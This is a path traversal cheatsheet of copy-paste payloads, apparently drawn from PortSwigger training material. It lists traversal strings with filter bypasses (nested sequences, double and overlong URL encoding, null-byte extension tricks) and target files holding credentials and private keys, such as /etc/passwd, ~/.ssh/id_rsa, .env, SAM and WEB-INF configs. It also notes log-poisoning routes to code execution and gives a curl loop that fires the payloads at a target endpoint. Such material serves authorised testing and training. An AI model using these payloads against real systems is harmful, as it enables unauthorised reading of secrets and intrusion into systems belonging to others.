# Path Traversal — Cheatsheet

Copy-paste payloads. Replace `etc/passwd` with the target file. Try depths 1–10.
Source: https://portswigger.net/web-security/file-path-traversal

## Basic traversal
| Payload |
|---|
| `../../../../etc/passwd` |
| `..\..\..\..\windows\win.ini` |
| `../../../../etc/passwd` (more `../` for deeper base dirs) |

## Absolute path (no traversal)
| Payload |
|---|
| `/etc/passwd` |
| `\windows\win.ini` |
| `C:\windows\win.ini` |

## Nested sequences (defeats single-pass stripping)
| Payload |
|---|
| `....//....//....//....//etc/passwd` |
| `....\/....\/....\/....\/etc/passwd` |
| `..../\..../\..../\windows/win.ini` |

## Single URL encoding
| Encoded | Decodes to |
|---|---|
| `%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd` | `../../../etc/passwd` |
| `..%2f..%2f..%2fetc%2fpasswd` | `../../../etc/passwd` |
| `%2e%2e/%2e%2e/%2e%2e/etc/passwd` | `../../../etc/passwd` |
| `..%5c..%5c..%5cwindows%5cwin.ini` | `..\..\..\windows\win.ini` |

## Double URL encoding
| Encoded | Decodes to |
|---|---|
| `%252e%252e%252f%252e%252e%252fetc%252fpasswd` | `../../etc/passwd` |
| `..%252f..%252f..%252fetc%252fpasswd` | `../../../etc/passwd` |
| `..%255c..%255cwindows%255cwin.ini` | `..\..\windows\win.ini` |

## Non-standard / overlong encodings
| Payload | Notes |
|---|---|
| `..%c0%af..%c0%af..%c0%afetc/passwd` | `%c0%af` = overlong `/` |
| `..%ef%bc%8f..%ef%bc%8fetc/passwd` | `%ef%bc%8f` = fullwidth `/` |
| `..%c1%9c..%c1%9cwindows%5cwin.ini` | overlong `\` (some IIS) |

## Required base folder (start-of-path validation)
| Payload |
|---|
| `/var/www/images/../../../etc/passwd` |
| `<expected-base-dir>/../../../../etc/passwd` |

## Required extension + null byte (legacy stacks)
| Payload |
|---|
| `../../../etc/passwd%00.png` |
| `/etc/passwd%00.png` |
| `....//....//etc/passwd%2500.png` |

## Combined examples
| Payload | Combines |
|---|---|
| `/var/www/images/%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd` | base dir + URL encoding |
| `/var/www/images/../../../etc/passwd%00.png` | base dir + null byte |
| `....//....//....//etc/passwd%00.jpg` | nested + null byte |

## Target files — Linux/Unix
| File | Why |
|---|---|
| `/etc/passwd` | Canonical proof; `root:x:0:0:root:/root:/bin/bash` |
| `/etc/hostname`, `/etc/issue` | Simple host info |
| `/etc/hosts` | Network config |
| `/proc/self/environ` | Process env (may hold secrets; aids LFI->RCE) |
| `/proc/self/cmdline` | Launch command |
| `/var/www/.../config*`, `.env` | App DB creds / secrets |
| `~/.ssh/id_rsa` | Private key (high impact) |
| `/var/log/apache2/access.log` | Log poisoning -> RCE |

## Target files — Windows
| File | Why |
|---|---|
| `C:\windows\win.ini` | Canonical proof; `[fonts]` / `[extensions]` |
| `C:\windows\system.ini` | Alt proof |
| `C:\windows\System32\drivers\etc\hosts` | Network config |
| `C:\inetpub\wwwroot\web.config` | IIS app config / secrets |
| `C:\Windows\repair\SAM` | Account DB (high impact, often locked) |

## In-context targets — dispatcher includes (JSP / .NET / PHP)
Use when the sink is a context-bound include (200 + empty body on OS paths) and `/etc/passwd` is unreachable. Resolve **relative to the app root**, not `/`.
| File | Why |
|---|---|
| `../WEB-INF/web.xml` | Java app config; routes, servlets, often DB creds / framework version |
| `../WEB-INF/classes/<pkg>/<Class>.class` | Compiled source -> decompile for logic & secrets |
| `../WEB-INF/applicationContext.xml`, `../WEB-INF/spring/*.xml` | Spring beans / datasource creds |
| `../WEB-INF/classes/application.properties`, `*.yml` | App config / secrets |
| `<page>.jsp` (in-context) | JSP source disclosure |
| `web.config` / `../web.config` | .NET app config, connection strings, machineKey |
| `../bin/<App>.dll` | .NET compiled assembly -> decompile |
| `appsettings.json` (.NET Core) | Config / secrets |

## Quick test loop (one file, minimal)
```bash
for p in \
  '../../../../etc/passwd' \
  '/etc/passwd' \
  '....//....//....//....//etc/passwd' \
  '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd' \
  '%252e%252e%252f%252e%252e%252fetc%252fpasswd' \
  '../../../etc/passwd%00.png'; do
  echo "== $p"; curl -s "https://TARGET/loadImage?filename=$p" | head -3
done
```
